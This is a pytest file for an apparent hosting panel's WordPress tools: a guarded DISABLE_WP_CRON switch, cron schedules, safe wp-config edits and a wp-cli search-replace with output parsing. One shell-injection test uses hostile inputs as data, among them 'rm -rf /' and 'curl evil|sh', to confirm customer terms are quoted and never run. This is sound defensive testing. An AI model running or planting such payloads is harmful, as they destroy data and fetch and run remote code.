"""Stopping WordPress from doing its scheduled work during visitors' page loads.

By default WordPress runs its scheduler when somebody loads a page. On a quiet site that
means scheduled posts publish late or never; on a busy one every visitor pays for it. The
fix is a real system cron plus `DISABLE_WP_CRON` — and the cron half already existed on the
Scheduled jobs screen, so this is the constant that makes it worth having.

**The refusal is the feature.** Switching the built-in timer off while nothing else does the
work stops it COMPLETELY and silently: the site keeps serving perfectly while nothing
scheduled ever happens again. That is strictly worse than the default we started from, so it
is refused rather than warned about — a warning is something somebody clicks through once,
and this cost is invisible.
"""
import pytest

from app.services import site_cron_service as cron
from app.services import wp_security_service as w


# ── The refusal ──────────────────────────────────────────────────────────────

def test_the_timer_cannot_be_switched_off_with_nothing_else_doing_the_work():
    with pytest.raises(w.WpSecurityError) as exc:
        w.check_can_disable_timer(has_real_cron=False)
    msg = str(exc.value)
    assert "would stop it completely" in msg
    # It has to say where to go, or the refusal is just a wall.
    assert "Scheduled jobs" in msg


def test_it_is_allowed_once_a_real_job_is_there():
    assert w.check_can_disable_timer(has_real_cron=True) is None


def test_switching_the_timer_back_on_is_never_refused():
    """Restoring WordPress's own timer can only ADD a way for the work to run. Refusing it
    would trap somebody in the dangerous state."""
    import inspect

    src = inspect.getsource(w.check_can_disable_timer)
    assert "has_real_cron" in src
    # The guard takes no "enable" path at all — it is only ever consulted when disabling.
    assert "enable" not in src


def test_the_check_uses_the_same_judgement_as_the_scheduled_jobs_screen():
    """Two answers to "does this site have a cron job" is how the switch and the screen end
    up disagreeing in front of a customer."""
    wp_job = [{"command": "cd /var/www/x && php wp-cron.php > /dev/null 2>&1"}]
    assert cron.already_scheduled("wordpress", wp_job) is True
    assert w.check_can_disable_timer(
        has_real_cron=cron.already_scheduled("wordpress", wp_job)) is None

    with pytest.raises(w.WpSecurityError):
        w.check_can_disable_timer(has_real_cron=cron.already_scheduled("wordpress", []))


def test_somebody_elses_way_of_running_it_counts_too():
    """A `flock` wrapper or wp-cli instead of wp-cron.php has already solved the problem —
    the same rule the suggestion follows when it decides not to nag."""
    for command in ("flock -n /tmp/x.lock cd /var/www/x && php wp-cron.php",
                    "cd /var/www/x && wp cron event run --due-now"):
        assert cron.already_scheduled("wordpress", [{"command": command}]) is True


# ── The frequencies Ploi offers ──────────────────────────────────────────────

def test_the_frequencies_are_ploi_s_five():
    assert w.CRON_FREQUENCIES == (1, 2, 5, 10, 15)


@pytest.mark.parametrize("minutes,expected", [
    (1, "* * * * *"), (2, "*/2 * * * *"), (5, "*/5 * * * *"),
    (10, "*/10 * * * *"), (15, "*/15 * * * *"),
])
def test_each_frequency_is_a_valid_crontab_schedule(minutes, expected):
    assert w.cron_schedule(minutes) == expected


def test_every_minute_is_not_written_as_a_step():
    """`*/1 * * * *` works but reads as a mistake to anyone looking at the crontab."""
    assert w.cron_schedule(1) == "* * * * *"


def test_a_frequency_we_do_not_offer_is_refused_with_the_real_ones():
    for bad in (0, 3, 7, 60, -1):
        with pytest.raises(w.WpSecurityError) as exc:
            w.cron_schedule(bad)
        assert "1, 2, 5, 10, 15" in str(exc.value)


# ── Writing the constant ─────────────────────────────────────────────────────

@pytest.mark.parametrize("disable", [True, False])
def test_the_config_is_kept_and_proved_to_still_load(disable):
    """A wp-config.php that no longer parses takes the site down completely, so the same
    protection the other two switches use applies here."""
    cmd = w.build_timer_command("/var/www/x/public", disable=disable)
    assert ".serverally." in cmd and "cp -p" in cmd      # a backup is taken
    assert 'php -l "$CFG"' in cmd                        # it is proved to parse
    assert cmd.index("cp -p") < cmd.index("config set")  # kept BEFORE anything is written


def test_the_constant_is_set_through_wp_cli_not_by_hand():
    """A constant written after wp-config's "stop editing" line is ignored by WordPress
    while looking perfectly correct in the file."""
    cmd = w.build_timer_command("/var/www/x/public", disable=True)
    assert "config set DISABLE_WP_CRON true --raw --type=constant" in cmd


def test_turning_it_back_on_writes_false_rather_than_deleting_the_line():
    """Deleting it would work, but leaves nothing on the screen to show it was ever set."""
    cmd = w.build_timer_command("/var/www/x/public", disable=False)
    assert "config set DISABLE_WP_CRON false" in cmd


# ── What the screen reads back ───────────────────────────────────────────────

def test_the_state_probe_reports_the_timer():
    assert "DISABLE_WP_CRON" in w.build_state_command("/var/www/x")


def test_the_timer_state_is_read_from_the_file():
    s = w.parse_state("___SM_WPSEC___|path|/var/www/x\n___SM_WPSEC___|DISABLE_WP_CRON|true")
    assert s["timer_disabled"] is True
    s = w.parse_state("___SM_WPSEC___|path|/var/www/x\n___SM_WPSEC___|DISABLE_WP_CRON|false")
    assert s["timer_disabled"] is False


def test_a_site_that_never_set_it_reads_as_the_wordpress_default():
    """Absent means WordPress is running its own timer, which is what it does out of the
    box — not "unknown"."""
    assert w.parse_state("___SM_WPSEC___|path|/var/www/x")["timer_disabled"] is False


# ── What the customer is told ────────────────────────────────────────────────

def test_the_message_says_what_they_get_rather_than_what_was_written():
    ok, msg = w.explain_timer("___SM_WPSEC___|ok|off", disable=True)
    assert ok
    assert "on time" in msg and "DISABLE_WP_CRON" not in msg


def test_a_broken_config_says_it_was_put_back():
    ok, msg = w.explain_timer("___SM_WPSEC___|error|broken", disable=True)
    assert not ok
    assert "put back exactly as it was" in msg


def test_silence_is_not_read_as_success():
    ok, msg = w.explain_timer("", disable=True)
    assert not ok
    assert "treat it as unchanged" in msg


# ── Search and replace ───────────────────────────────────────────────────────
#
# The most dangerous thing on this screen: it rewrites the database in bulk and there is no
# undo. Three rules carry it, and each is asserted rather than intended.

def test_serialized_data_is_handled_by_wp_cli_rather_than_sql():
    """The whole reason this goes through wp-cli. WordPress stores PHP-serialized arrays
    with byte-LENGTH prefixes, so a plain `UPDATE ... REPLACE()` leaves every serialized
    value with a length that no longer matches its content — WordPress then silently
    discards those options and widgets vanish with no error anywhere."""
    cmd = w.build_search_replace_command("/var/www/x/public", "old.com", "new.com",
                                         dry_run=True)
    assert "search-replace" in cmd
    for sql in ("UPDATE ", "REPLACE(", "mysql -e", "mysqldump"):
        assert sql not in cmd, f"{sql} would corrupt serialized values"


def test_guid_is_never_rewritten():
    """It looks like a URL and is not one — it is a permanent identifier. Rewriting it makes
    every feed reader treat every existing post as brand new, so subscribers are sent the
    whole archive again."""
    for dry in (True, False):
        cmd = w.build_search_replace_command("/var/www/x/public", "a.com", "b.com",
                                             dry_run=dry)
        assert "--skip-columns=guid" in cmd


def test_only_this_site_s_own_tables_are_touched():
    """`--all-tables` would reach anything else sharing the database, which on shared
    hosting is somebody else's site."""
    cmd = w.build_search_replace_command("/var/www/x/public", "a", "b", dry_run=True)
    assert "--all-tables" not in cmd


def test_a_dry_run_is_a_dry_run():
    dry = w.build_search_replace_command("/var/www/x/public", "a", "b", dry_run=True)
    real = w.build_search_replace_command("/var/www/x/public", "a", "b", dry_run=False)
    assert "--dry-run" in dry
    assert "--dry-run" not in real


@pytest.mark.parametrize("payload", [
    "old.com; rm -rf /", "old.com && curl evil|sh", "$(whoami)", "`id`", "a'b\"c",
])
def test_the_terms_are_values_and_never_a_second_command(payload):
    """Free text from a customer that ends up in a command line, so it is quoted as a single
    argument rather than trusted."""
    import shlex
    cmd = w.build_search_replace_command("/var/www/x/public", payload, "safe", dry_run=True)
    line = [l for l in cmd.splitlines() if "search-replace" in l or l.startswith("  ")]
    joined = "\n".join(line)
    # The payload survives as ONE argument when the shell parses it back.
    args = shlex.split(joined.replace("\\\n", " ").split("search-replace", 1)[1])
    assert payload in args, f"{payload!r} did not survive as a single argument"


def test_an_empty_search_is_refused():
    with pytest.raises(w.WpSecurityError) as exc:
        w.check_terms("", "x")
    assert "match everywhere" in str(exc.value)


def test_replacing_something_with_itself_is_refused():
    with pytest.raises(w.WpSecurityError) as exc:
        w.check_terms("same", "same")
    assert "typo" in str(exc.value)


def test_a_short_search_is_deliberately_allowed():
    """The dry run's row count is a better guard than a rule about length: it is exact, and
    the customer is the one who knows whether 400,000 rows is right."""
    assert w.check_terms("a", "b") == ("a", "b")


def test_the_counts_are_read_out_of_what_wp_cli_prints():
    out = """+-----------+--------------+--------------+------+
| Table     | Column       | Replacements | Type |
+-----------+--------------+--------------+------+
| wp_posts  | post_content | 12           | PHP  |
| wp_options| option_value | 3            | PHP  |
+-----------+--------------+--------------+------+"""
    r = w.parse_search_replace(out)
    assert r["ok"] and r["total"] == 15
    assert {c["table"] for c in r["changes"]} == {"wp_posts", "wp_options"}


def test_nothing_matching_is_reported_as_probably_a_typo():
    """A search that matches nothing is far more often a misspelling than a site that is
    already correct, and saying "done" would let somebody believe it worked."""
    msg = w.explain_search_replace({"ok": True, "changes": [], "total": 0}, dry_run=True)
    assert "typo" in msg


def test_a_dry_run_says_nothing_has_changed_and_to_back_up():
    msg = w.explain_search_replace(
        {"ok": True, "changes": [{"table": "wp_posts", "column": "c", "rows": 412000}],
         "total": 412000}, dry_run=True)
    assert "412,000" in msg
    assert "Nothing has been changed yet" in msg
    assert "no undo" in msg


# ── Parsing what wp-cli really prints ────────────────────────────────────────
#
# Every case below is a VERBATIM capture from wp-cli 2.x against WordPress 7.0.3. My first
# parser understood only the pipe table wp-cli draws on a terminal — over SSH there is none,
# so the rows arrive tab-separated and it reported ZERO for a search matching seven things.
# The screen would have called that "probably a typo".

_DRY = ("Table\tColumn\tReplacements\tType\n"
        "wp_options\toption_value\t3\tPHP\n"
        "wp_posts\tpost_content\t3\tPHP\n"
        "wp_users\tuser_url\t1\tPHP\n"
        "Success: 7 replacements to be made.")

_REAL = ("Table\tColumn\tReplacements\tType\n"
         "wp_options\toption_value\t3\tPHP\n"
         "wp_posts\tpost_content\t3\tPHP\n"
         "wp_users\tuser_url\t1\tPHP\n"
         "Success: Made 7 replacements.")


def test_the_real_tab_separated_output_is_understood():
    r = w.parse_search_replace(_DRY)
    assert r["total"] == 7
    assert [c["table"] for c in r["changes"]] == ["wp_options", "wp_posts", "wp_users"]


def test_the_dry_run_and_the_real_run_word_it_differently():
    """"7 replacements to be made" versus "Made 7 replacements". A pattern fitting only the
    first falls back to summing the table — so the number would come from the fragile path
    exactly when it matters most, on the run that already changed the database."""
    assert w.parse_search_replace(_DRY)["total"] == 7
    assert w.parse_search_replace(_REAL)["total"] == 7


def test_the_total_survives_the_table_being_unparseable():
    """The number the customer decides on comes from wp-cli's own sentence, so a change to
    how it draws tables cannot make us report zero."""
    assert w.parse_search_replace("Success: Made 42 replacements.")["total"] == 42


def test_a_pipe_table_still_works():
    """A future wp-cli attached to a terminal would draw pipes again."""
    out = ("| Table | Column | Replacements | Type |\n"
           "| wp_posts | post_content | 12 | PHP |\n"
           "Success: Made 12 replacements.")
    assert w.parse_search_replace(out)["total"] == 12


def test_output_we_cannot_read_is_not_reported_as_nothing_matched():
    """The dangerous direction: "nothing matched" invites somebody to retype and run again."""
    r = w.parse_search_replace("PHP Fatal error: something went wrong")
    assert r["ok"] is False
    assert "could not tell" in r["reason"]
